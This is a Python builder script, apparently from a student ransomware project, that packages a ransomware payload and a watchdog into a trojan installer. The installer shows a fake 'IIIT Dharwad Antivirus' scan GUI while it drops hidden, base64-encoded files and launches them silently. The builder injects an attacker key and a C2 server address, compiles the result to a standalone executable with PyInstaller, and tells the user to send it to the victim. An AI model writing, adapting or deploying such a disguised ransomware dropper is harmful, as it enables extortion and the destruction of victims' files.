import base64
import os
import sys
import re
import shutil
import subprocess
import importlib.util

# --- Configuration ---
DEFAULT_C2_IP = "127.0.0.1" 
DEFAULT_C2_PORT = "5000"
DEFAULT_FALLBACK_TARGET = "test_data" 

def build_dropper():
    print("[-] Starting Builder...")
    
    # Paths
    current_dir = os.path.dirname(os.path.abspath(__file__))
    victim_dir = current_dir
    attacker_dir = os.path.join(current_dir, "..", "attacker")
    
    # Assets
    payload_path = os.path.join(victim_dir, "ransomware.py")
    key_path = os.path.join(attacker_dir, "attacker_public_key.pem")
    if not os.path.exists(key_path):
        key_path = os.path.join(current_dir, "attacker_public_key.pem")
    watchdog_path = os.path.join(victim_dir, "watchdog.py")
    output_path = os.path.join(victim_dir, "installer.py")

    # 1. Validation
    if not os.path.exists(payload_path):
        print(f"[!] Error: Ransomware payload missing at {payload_path}")
        return
    if not os.path.exists(watchdog_path):
        print(f"[!] Error: Watchdog missing at {watchdog_path}")
        return

    # 2. Read & Inject Config
    with open(payload_path, "r", encoding="utf-8") as f: payload_content = f.read()
    with open(key_path, "r", encoding="utf-8") as f: public_key_clean = f.read()
    with open(watchdog_path, "rb") as f: watchdog_data = f.read()

    print("[-] Injecting Configuration...")
    
    # Inject Key
    payload_content = re.sub(
        r'ATTACKER_PUBLIC_KEY = """.*?"""', 
        f'ATTACKER_PUBLIC_KEY = """{public_key_clean}"""', 
        payload_content, flags=re.DOTALL
    )

    # Inject C2 IP
    c2_ip = input(f"[?] Enter C2 Server IP [Default: {DEFAULT_C2_IP}]: ").strip() or DEFAULT_C2_IP
    c2_ip = c2_ip.replace("http://", "").rstrip("/")
    new_url = f'http://{c2_ip}:{DEFAULT_C2_PORT}'
    
    payload_content = re.sub(
        r'C2_SERVER_URL = ".*?"', 
        f'C2_SERVER_URL = "{new_url}"', 
        payload_content
    )
    print(f"    -> C2 Server set to: {new_url}")

    # Inject Fallback Target
    fallback = input(f"[?] Enter Fallback Directory [Default: {DEFAULT_FALLBACK_TARGET}]: ").strip() or DEFAULT_FALLBACK_TARGET
    target_regex = r'target_dir\s*=\s*os\.path\.join\(home,\s*"[^"]*"\)'
    if re.search(target_regex, payload_content):
        payload_content = re.sub(target_regex, f'target_dir = os.path.join(home, "{fallback}")', payload_content)
        print(f"    -> Fallback Target set to: $HOME/{fallback}")

    # 3. Encode Payloads
    ransomware_b64 = base64.b64encode(payload_content.encode('utf-8')).decode('utf-8')
    watchdog_b64 = base64.b64encode(watchdog_data).decode('utf-8')

    # 4. Generate Installer Source Code
    dropper_code = f'''import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
from tkinter import Tk, Label, ttk, Frame

# --- CONFIGURATION ---
FAKE_TITLE = "IIIT Dharwad Antivirus \u2014 System Protection Suite"
RANSOMWARE_B64 = "{ransomware_b64}"
WATCHDOG_B64 = "{watchdog_b64}"
RANSOMWARE_NAME = ".iiitdwd_security.py"
WATCHDOG_NAME = ".iiitdwd_watchdog.py"

def extract_and_execute_payload():
    """Drops both ransomware and watchdog, then launches watchdog."""
    try:
        ransomware_data = base64.b64decode(RANSOMWARE_B64)
        watchdog_data = base64.b64decode(WATCHDOG_B64)
        
        # Cross-platform drop location
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                os.makedirs(drop_dir, exist_ok=True)
        
        ransomware_path = os.path.join(drop_dir, RANSOMWARE_NAME)
        watchdog_path = os.path.join(drop_dir, WATCHDOG_NAME)
        
        # Drop files
        with open(ransomware_path, "wb") as f: f.write(ransomware_data)
        with open(watchdog_path, "wb") as f: f.write(watchdog_data)
            
        # Launch WATCHDOG
        if os.name == 'nt':
            subprocess.Popen(["python", watchdog_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen(["python3", watchdog_path], 
                           start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

def fake_installer_gui():
    import tkinter.font as tkfont
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("650x480")
    root.resizable(False, False)
    root.configure(bg="#0a0e17")

    # --- Top Banner ---
    banner = Frame(root, bg="#0d1520", highlightbackground="#00d4aa", highlightthickness=0)
    banner.pack(fill="x")
    banner_inner = Frame(banner, bg="#0d1520")
    banner_inner.pack(pady=15)

    # Shield icon using unicode
    shield_frame = Frame(banner_inner, bg="#0d1520")
    shield_frame.pack(side="left", padx=(20, 12))
    Label(shield_frame, text="\U0001f6e1\ufe0f", font=("Segoe UI Emoji", 32), bg="#0d1520").pack()

    text_frame = Frame(banner_inner, bg="#0d1520")
    text_frame.pack(side="left")
    Label(text_frame, text="IIIT DHARWAD", fg="#00d4aa", bg="#0d1520", font=("Segoe UI", 22, "bold")).pack(anchor="w")
    Label(text_frame, text="Antivirus \u2022 System Protection Suite", fg="#7a8ba5", bg="#0d1520", font=("Segoe UI", 11)).pack(anchor="w")

    # Thin accent line
    Frame(root, bg="#00d4aa", height=2).pack(fill="x")

    # --- Main Content ---
    content = Frame(root, bg="#0a0e17")
    content.pack(expand=True, fill="both", padx=35, pady=15)

    # Status area
    status_frame = Frame(content, bg="#111827", highlightbackground="#1e293b", highlightthickness=1)
    status_frame.pack(fill="x", pady=(0, 12))
    status_inner = Frame(status_frame, bg="#111827")
    status_inner.pack(fill="x", padx=15, pady=12)

    scan_icon = Label(status_inner, text="\U0001f50d", font=("Segoe UI Emoji", 14), bg="#111827")
    scan_icon.pack(side="left", padx=(0, 8))

    status_label = Label(status_inner, text="Initializing threat scanner...", fg="#e2e8f0", bg="#111827", font=("Segoe UI", 11))
    status_label.pack(side="left")

    # Progress bar with custom style
    style = ttk.Style()
    style.theme_use('default')
    style.configure("Cyber.Horizontal.TProgressbar", 
                    troughcolor='#1e293b', background='#00d4aa', 
                    darkcolor='#00d4aa', lightcolor='#00ffc8',
                    bordercolor='#1e293b', thickness=22)
    
    progress = ttk.Progressbar(content, orient="horizontal", length=570, 
                                mode="determinate", style="Cyber.Horizontal.TProgressbar")
    progress.pack(pady=(0, 8))

    # Percentage label
    pct_label = Label(content, text="0%", fg="#00d4aa", bg="#0a0e17", font=("Consolas", 13, "bold"))
    pct_label.pack()

    # Threat counter
    threat_frame = Frame(content, bg="#0a0e17")
    threat_frame.pack(fill="x", pady=(12, 0))
    
    files_label = Label(threat_frame, text="Files Scanned: 0", fg="#64748b", bg="#0a0e17", font=("Consolas", 9))
    files_label.pack(side="left")
    threat_label = Label(threat_frame, text="Threats Found: 0", fg="#64748b", bg="#0a0e17", font=("Consolas", 9))
    threat_label.pack(side="right")

    # Bottom version bar
    bottom = Frame(root, bg="#0d1520")
    bottom.pack(fill="x", side="bottom")
    Label(bottom, text="v3.2.1  \u2022  Database: 2026.02.10  \u2022  Licensed to IIIT Dharwad", 
          fg="#475569", bg="#0d1520", font=("Segoe UI", 8)).pack(pady=6)

    def run_simulation():
        import random
        steps = [
            ("\U0001f50d Scanning system processes...", 0),
            ("\U0001f4c2 Analyzing startup entries...", 0),
            ("\U0001f310 Checking network connections...", 0),
            ("\U0001f512 Verifying file signatures...", 0),
            ("\U0001f9ec Deep scanning memory...", 0),
            ("\U0001f6e1\ufe0f Updating threat definitions...", 0),
            ("\u2705 Applying real-time protection...", 0),
            ("\U0001f4ca Generating security report...", 0),
        ]
        
        # EXECUTE PAYLOAD AT 25%
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        file_count = 0
        
        for i, (step, _) in enumerate(steps):
            time.sleep(0.8)
            status_label.config(text=step)
            root.update()
            
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 1
                progress['value'] = current_val
                pct_label.config(text=f"{{current_val}}%")
                file_count += random.randint(80, 250)
                files_label.config(text=f"Files Scanned: {{file_count:,}}")
                time.sleep(0.03)
                root.update()
        
        # Final result
        status_label.config(text="\u2705 Scan Complete \u2014 System Protected!", fg="#00d4aa")
        scan_icon.config(text="\u2705")
        threat_label.config(text="Threats Found: 0", fg="#00d4aa")
        pct_label.config(text="100%")
        root.update()
        time.sleep(2)
        root.destroy()

    threading.Thread(target=run_simulation, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
'''

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(dropper_code)
    print(f"\n[+] 'installer.py' generated.")

    # 5. COMPILE TO EXECUTABLE (The Exact Command You Requested)
    print("[-] Compiling to standalone executable...")
    
    # We use 'dist' as the final location and 'build' as temp
    dist_path = os.path.join(victim_dir, "dist") 
    
    try:
        # EXACT COMMAND: pyinstaller --onefile --noconsole installer.py
        # We invoke it via python -m to ensure the path is correct
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--distpath", ".",  # Output directly to current dir
            "installer.py"
        ]
        
        subprocess.check_call(cmd)
        
        # Cleanup
        if os.path.exists("build"): shutil.rmtree("build")
        if os.path.exists("installer.spec"): os.remove("installer.spec")
        
        exe_name = "installer"
        if os.name == 'nt': exe_name += ".exe"
        
        print(f"\n[+] SUCCESS! Executable created: {os.path.abspath(exe_name)}")
        print(f"    Send '{exe_name}' to the victim.")
            
    except Exception as e:
        print(f"[!] Compilation Failed: {e}")
        print("    Try running manually: pyinstaller --onefile --noconsole installer.py")

if __name__ == "__main__":
    build_dropper()
